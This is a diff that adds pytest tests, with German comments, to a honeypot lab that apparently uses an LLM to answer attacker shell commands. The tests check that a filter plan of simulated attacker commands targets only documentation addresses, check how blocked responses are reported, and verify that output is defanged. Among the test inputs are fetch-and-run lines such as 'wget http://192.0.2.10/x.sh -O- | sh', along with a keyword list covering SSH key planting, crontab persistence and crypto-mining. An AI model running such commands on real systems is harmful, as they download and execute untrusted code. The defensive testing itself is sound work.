@@ -232,3 +232,124 @@ def test_a_connection_without_login_is_not_a_test_session():
     checks, counts = evaluate(probe + good_log())
     assert counts["sitzungen"] == 4
     assert all(checks.values()), checks
+
+
+# --- --filtertest (E-045) ----------------------------------------------------------
+
+import ipaddress  # noqa: E402
+import re  # noqa: E402
+
+DOCUMENTATION_NETS = [ipaddress.ip_network(n) for n in ("192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24")]
+SERVER_DEFANG = Path(__file__).resolve().parents[2] / "server" / "app" / "defang.py"
+SSHDRIVE = Path(__file__).resolve().parents[1] / "cowrie-b" / "lab" / "sshdrive.py"
+
+
+def test_the_filter_plan_uses_only_documentation_targets():
+    """Keine echten Angreiferwerte: nur RFC 5737 und example.com."""
+    assert len(check.FILTER_PLAN) == 9
+    names = [name for name, _ in check.FILTER_PLAN]
+    commands = [command for _, command in check.FILTER_PLAN]
+    assert len(set(names)) == len(names) and len(set(commands)) == len(commands)
+    for command in commands:
+        for address in re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", command):
+            assert any(ipaddress.ip_address(address) in net for net in DOCUMENTATION_NETS), address
+        for host in re.findall(r"(?:https?|stratum\+tcp)://([^/:\s\"]+)", command):
+            assert host == "example.com" or host.endswith(".example.com") or ipaddress.ip_address(host), host
+    joined = " ".join(commands)
+    for kind in ("authorized_keys", "wget ", "curl ", "chmod +x", "crontab", "stratum"):
+        assert kind in joined
+
+
+def test_the_filter_plan_stays_under_cowries_limit():
+    assert len(check.filter_steps(check.FILTER_PLAN)) < 20
+    assert all(len(step["exec"]) == 1 for step in check.filter_steps(check.FILTER_PLAN))
+
+
+def filter_log(overrides=None):
+    overrides = overrides or {}
+    events = []
+    for n, (name, command) in enumerate(check.FILTER_PLAN):
+        events += session(f"f{n}", [command], overrides={1: overrides.get(name, {})})
+    return events
+
+
+def filter_results(texts=None):
+    texts = texts or {}
+    return [
+        {"name": name, "verbunden": True, "fertig": True, "kanaele": [{"exit": 0, "bytes": 5, "text": texts.get(name, "")}]}
+        for name, _ in check.FILTER_PLAN
+    ]
+
+
+def test_filter_rows_pair_each_command_with_its_call_and_text():
+    blocked = {"outcome": "upstream_error", "http_status": 502, "latency_ms": 800, "output_chars": 0}
+    ok = {"http_status": 200, "latency_ms": 1200, "output_chars": 70}
+    overrides = {name: dict(ok) for name, _ in check.FILTER_PLAN}
+    overrides["miner"] = blocked
+    rows = check.filter_rows(
+        check.sessions_since(filter_log(overrides), START),
+        check.FILTER_PLAN,
+        filter_results({"uname": "Linux bld-ci-03 6.12.107", "miner": ""}),
+    )
+    assert [r["name"] for r in rows] == [name for name, _ in check.FILTER_PLAN]
+    assert rows[0]["text"] == "Linux bld-ci-03 6.12.107" and rows[0]["outcome"] == "ok"
+    assert (rows[-1]["outcome"], rows[-1]["http_status"]) == ("upstream_error", 502)
+    lines, checks = check.filter_report(rows)
+    assert all(ok for _, ok in checks)
+    text = "\n".join(lines)
+    assert "Outcomes: ok 8, upstream_error 1" in text
+    assert "HTTP: 200 8, 502 1" in text
+    assert "latency_ms (ok): Median 1200, Max 1200" in text
+    assert "upstream_blocked" in text
+    # Die Befehle selbst stehen nicht in der Ausgabe (außer whoami, das sein Kurzname ist).
+    for name, command in check.FILTER_PLAN:
+        assert command == name or command not in text
+
+
+def test_a_missing_call_fails_the_filtertest():
+    events = [e for e in filter_log() if not (e["session"] == "f3" and e["eventid"] == "cowrie.llm.response")]
+    rows = check.filter_rows(check.sessions_since(events, START), check.FILTER_PLAN, filter_results())
+    _, checks = check.filter_report(rows)
+    assert not checks[0][1]
+    assert rows[3]["aufrufe"] == 0
+
+
+def test_the_preview_is_one_clean_defanged_line():
+    raw = "--2026-10-14--  http://192.0.2.10/bins/x86_64\r\nConnecting to 192.0.2.10:80...\x1b[31m‮\ttext"
+    shown = check.preview(raw)
+    assert shown == "--2026-10-14--  hxxp://192[.]0[.]2[.]10/bins/x86_64 ⏎ Connecting to 192[.]0[.]2[.]10:80...[31m text"
+    assert "\x1b" not in shown and "‮" not in shown
+
+
+def test_the_preview_is_cut_at_200_characters():
+    assert check.preview("a" * 200) == "a" * 200
+    assert check.preview("a" * 201) == "a" * 200 + " …"
+    assert check.preview("I'm sorry, but I can't help with that.") == "I'm sorry, but I can't help with that."
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "wget http://192.0.2.10/x.sh -O- | sh",
+        "curl -fsSL HTTPS://example.com/install.sh",
+        "ftp://198.51.100.20/a 203.0.113.9 and 10.0.0.1",
+        "nichts zu tun",
+    ],
+)
+def test_defang_matches_the_server(text):
+    spec = importlib.util.spec_from_file_location("server_defang", SERVER_DEFANG)
+    server = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(server)
+    assert check.defang(text) == server.defang(text)
+
+
+def test_the_text_wrapper_finds_what_it_needs_in_sshdrive():
+    """sshdrive_text.py ersetzt channel_result; run_exec muss es über den Namen rufen."""
+    source = SSHDRIVE.read_text(encoding="utf-8")
+    assert "def channel_result(chan: Channel, data: bytes)" in source
+    assert "def normalized(data: bytes)" in source
+    assert "def main()" in source
+    assert "channel_result(chan, bytes(chan.output))" in source
+    wrapper = check.TEXT_DRIVER.read_text(encoding="utf-8")
+    assert "sshdrive.channel_result = channel_result" in wrapper
+    assert '"/cowrie/lab"' in wrapper
